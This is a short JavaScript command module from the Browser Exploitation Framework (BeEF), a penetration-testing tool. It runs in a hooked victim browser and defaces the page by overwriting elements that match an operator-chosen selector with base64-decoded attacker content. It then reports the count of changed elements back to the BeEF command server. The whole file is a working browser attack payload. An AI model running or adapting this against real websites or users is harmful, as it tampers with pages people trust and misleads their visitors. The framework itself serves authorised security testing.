//
// Copyright (c) 2006-2018 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

	var result = $j('<%= @deface_selector %>').each(function() {
		$j(this).html(decodeURIComponent(beef.encode.base64.decode('<%= Base64.strict_encode64(@deface_content) %>')););
	}).length;

    beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=Defaced "+ result +" elements", beef.are.status_success());
});
